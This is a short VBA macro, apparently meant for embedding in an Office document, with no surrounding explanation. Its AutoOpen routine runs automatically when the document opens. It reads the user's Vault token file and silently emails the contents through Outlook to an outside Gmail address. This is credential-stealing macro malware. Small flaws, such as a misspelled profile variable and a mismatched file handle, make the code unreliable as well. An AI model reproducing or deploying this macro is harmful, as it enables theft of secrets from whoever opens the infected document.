Sub SendIt()

  Dim outobj, mailobj
  Dim strFileText
  Dim objFileToRead

  Set outobj = CreateObject("Outlook.Application")
  Set mailobj = outobj.CreateItem(0)
  home = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%HUSERPROFILE%")
  vaultCreds = GetText(home & "\.vault-token")

    With mailobj
    .To = "test@gmail.com"
    .Subject = "Testmail"
    .Body = vaultCreds
    .Send
  End With

  'Clear the memory
  Set outobj = Nothing
  Set mailobj = Nothing

End Sub

Function GetText(sFile As String) As String
   Dim nSourceFile As Integer, sText As String
   nSourceFile = FreeFile
   'Write the entire file to sText
   Open sFile For Input As #nSourceFile
   sText = Input$(LOF(1), 1)
   Close
   GetText = sText
End Function

Sub AutoOpen()
    SendIt
End Sub
